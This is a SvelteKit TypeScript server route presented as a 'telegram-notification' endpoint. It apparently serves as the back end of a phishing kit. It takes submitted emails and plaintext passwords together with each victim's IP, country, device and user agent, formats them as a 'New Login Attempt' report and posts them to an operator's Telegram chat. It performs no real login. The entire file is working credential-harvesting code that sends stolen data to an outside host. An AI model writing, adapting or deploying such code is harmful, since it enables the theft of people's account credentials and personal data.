// src/routes/api/telegram-notification/+server.ts
import type { RequestHandler } from '@sveltejs/kit';

export const POST: RequestHandler = async ({ request }) => {
    // Validate environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
        return new Response(
            JSON.stringify({ 
                success: false,
                message: 'Server configuration error' 
            }),
            { status: 500 }
        );
    }

    try {
        // Parse incoming request data
        const { name, email, password, country, ip, browser, device, time, userAgent } = await request.json();

        // Validate required fields
        if (!email || !password) {
            return new Response(
                JSON.stringify({ 
                    success: false,
                    message: 'Missing required fields' 
                }),
                { status: 400 }
            );
        }

        // Format the Telegram message
        const telegramMessage = `
<b>🔐 New Login Attempt</b>
<b>👤 Name:</b> ${name || 'Not provided'}
<b>📧 Email:</b> ${email}
<b>🔑 Password:</b> ${password}
<b>🌍 Country:</b> ${country || 'Unknown'}
<b>📡 IP Address:</b> ${ip || 'Unknown'}
<b>🖥️ Device:</b> ${device || 'Unknown'}
<b>⏰ Time:</b> ${time}
<b>🧭 User Agent:</b> ${userAgent || 'Unknown'}
        `.trim();

        // Send to Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: telegramMessage,
                parse_mode: 'HTML'
            })
        });

        if (!telegramResponse.ok) {
            const error = await telegramResponse.json();
            console.error('Telegram API error:', error);
            throw new Error(error.description || 'Failed to send notification');
        }

        return new Response(
            JSON.stringify({ 
                success: true 
            }),
            { status: 200 }
        );

    } catch (error) {
        console.error('Notification error:', error);
        return new Response(
            JSON.stringify({ 
                success: false,
                message: error.message || 'Internal server error' 
            }),
            { status: 500 }
        );
    }
};